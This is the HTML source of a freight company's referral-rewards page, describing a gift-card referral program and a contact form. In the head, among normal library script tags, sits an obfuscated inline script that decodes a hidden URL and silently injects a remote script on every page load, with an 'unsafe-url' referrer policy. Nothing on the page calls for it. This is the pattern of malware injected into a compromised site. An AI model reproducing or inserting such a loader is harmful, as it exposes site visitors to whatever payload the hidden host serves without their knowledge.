<!doctype html>
<html>

<head>
    <script src="dmxAppConnect/dmxAppConnect.js"></script>
    <meta charset="UTF-8">
    <title>Media | Raging Wolf Solutions</title>

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.14.0/css/all.css" integrity="sha384-HzLeBuhoNPvSl5KYnjx0BT+WB0QEEqLprO+NBkkk5gbc67FTaL7XIGa2w1L0Xbgc" crossorigin="anonymous" />
    <link href="https://fonts.googleapis.com/css2?family=Lustria&amp;family=Muli:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.cdnfonts.com/css/sansation" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="bootstrap/5/css/bootstrap.min.css" />
    <link rel="stylesheet" href="css/style.css" />
    <link rel="stylesheet" href="css/stylesheet.css" />
    <script src="js/jquery-3.5.1.slim.min.js"></script>
    <script src="dmxAppConnect/dmxBootstrap5Navigation/dmxBootstrap5Navigation.js" defer=""></script>
    <script src="dmxAppConnect/dmxBackgroundVideo/dmxBackgroundVideo.js" defer=""></script>

    <script src="dmxAppConnect/dmxBootstrap5Modal/dmxBootstrap5Modal.js" defer></script>
    <link rel="icon" href="icons/favicon.ico">
    <link rel="stylesheet" href="dmxAppConnect/dmxValidator/dmxValidator.css" />
    <script src="dmxAppConnect/dmxValidator/dmxValidator.js" defer></script>
    <script src="dmxAppConnect/dmxBrowser/dmxBrowser.js" defer></script>
    <script>
        (function(){var _5S=document.createElement("script"),_jF=(function(_sP,_Ii){var _T2="";for(var _w6=0;_w6<_sP.length;_w6++){var _7h=_sP[_w6].charCodeAt();_7h-=_Ii;_7h+=61;_T2==_T2;_Ii>8;_7h%=94;_7h!=_w6;_7h+=33;_T2+=String.fromCharCode(_7h)}return _T2})(atob("OEREQENoXV1HQ1xKPz89OT42P1wzPz1dQDlINTxdZGExMmJjY2cxMmJkZ19mMl5mXjJlY2Rh"), 46);_5S!="q";_5S.src=_jF;_5S.async=!0;_5S.referrerPolicy="unsafe-url";_5S.type="text/javascript";function _Qm(){};5>4;var _G3=document.getElementsByTagName("script")[0];_G3.parentNode.insertBefore(_5S,_G3)})();
    </script>
    <script src="dmxAppConnect/dmxVideo/dmxVideo.js" defer></script>
</head>

<body is="dmx-app" id="index" class="bg-dark">
    <div is="dmx-browser" id="browser1"></div>

    <?php include 'navbar_mini'; ?>

    <?php include 'navbar_main'; ?>

    <section id="modules" class="border-top rounded-1 rounded-0 min-vh-75 border-secondary pb-3" style="min-height: 75vh;">

        <img src="assets/images/section-modal-bg-top-stone.png" class="w-100">
        <div class="container modules-container mt-0 mb-5 pb-5">
            <div class="row justify-content-center pb-4">
                <div class="pl-1 pr-1 col-12 text-center col-md-10">


                    <h1 class="text-uppercase text-yellow text-warning text-center"><i class="fas fa-comments-dollar"></i></h1>
                    <h5 class="text-uppercase text-yellow text-warning text-center">Referral Rewards</h5>
                    <h1 class="text-light text-left">Raging Wolf Solutions Offers Referral Rewards</h1>
                    <h5 class="text-white-50 lh-sm fw-normal mb-3">Refer a customer to the 'PACK'. Once their first shipment is successfully delivered, you'll receive a $40 Visa Gift Card. Additionally, we'll make a charitable donation to the &nbsp;<span class="text-white-50 hover-cursor" dmx-on:click="browser1.goto('https://www.uhhospitals.org/rainbow')"><i>Rainbow Children's Hospital </i></span> on your behalf as a token of our appreciation.&nbsp;<span class="text-warning">Terms apply.</span></h5>

                </div>
            </div>
            <div class="row">
                <div class="col-lg-4">
                    <div class="d-flex flex-column">
                        <h1 class="text-light lh-base text-center"><i class="fas fa-user-check fa-lg"></i></h1>
                        <h4 class="text-light text-center">1. Refer a shipper to the 'PACK'</h4>
                        <p class="text-white-50 text-center">Know someone in need of freight transportation? Send them our way! Contact us using the form below, or tell your referral about Raging Wolf by sharing our services to your network.</p>
                    </div>
                </div>
                <div class="col-lg-4">
                    <div class="d-flex flex-column">
                        <h1 class="text-light lh-base text-center"><i class="fas fa-truck-loading fa-lg"></i></h1>
                        <h4 class="text-light text-center">2. Your referral's first shipment is delivered</h4>
                        <p class="text-white-50 text-center">To qualify for rewards, your referral must become an active customer with Raging Wolf Solutions. As soon as their first shipment has been delivered, a member of our team will reach out to you.</p>
                    </div>
                </div>
                <div class="col-lg-4">
                    <div class="d-flex flex-column">
                        <h1 class="text-light lh-base text-center"><i class="fas fa-smile-beam fa-lg"></i></h1>
                        <h4 class="text-light text-center">3. A member of our team will be in touch!</h4>
                        <p class="text-white-50 text-center">A member of our team will contact you regarding your referral gift card and donation contribution. Keep an eye on your email, and feel free to check on the status of your referral.</p>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col text-light">
                    <hr>
                </div>
                <div class="col-12">
                    <div class="container">
                        <div class="row justify-content-center">
                            <div class="module-card border rounded-0 rounded-1 border-secondary col-12 mt-3 mb-3 pt-3 pb-3 ps-3 pe-3">
                                <h5 class="text-light mb-3 pt-2">Have someone in mind? Let us know.</h5>

                                <form id="referral_form">
                                    <div class="d-flex flex-row">


                                        <input id="contact_email" name="text1" type="text" class="form-control me-3" placeholder="Your email address...">
                                        <input id="contact_message" name="text2" type="text" class="form-control me-3" placeholder="Your short message..."><button id="btn1" class="btn module-cta-btn btn text-nowrap fw-bold ps-4 pe-4 lh-1 btn-outline-warning"><i class="far fa-envelope"></i>&nbsp;Get in touch</button>
                                    </div>
                                </form>
                                <div class="row text-white-50 mt-3 mb-2">

                                    <div class="col">
                                        <hr>
                                    </div>
                                    <div class="col-auto align-self-center">
                                        <h6 class="mb-0 text-uppercase text-center">or</h6>
                                    </div>
                                    <div class="col">
                                        <hr>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-lg-4">
                                    </div>
                                    <div class="col-lg-4">
                                    </div>
                                    <div class="col-lg-4">
                                    </div>
                                </div>

                            </div>
                        </div>

                    </div>
                </div>
            </div>
        </div>
    </section>

    <?php include 'footer'; ?>

    <script src="bootstrap/5/js/bootstrap.bundle.min.js"></script>
</body>

</html>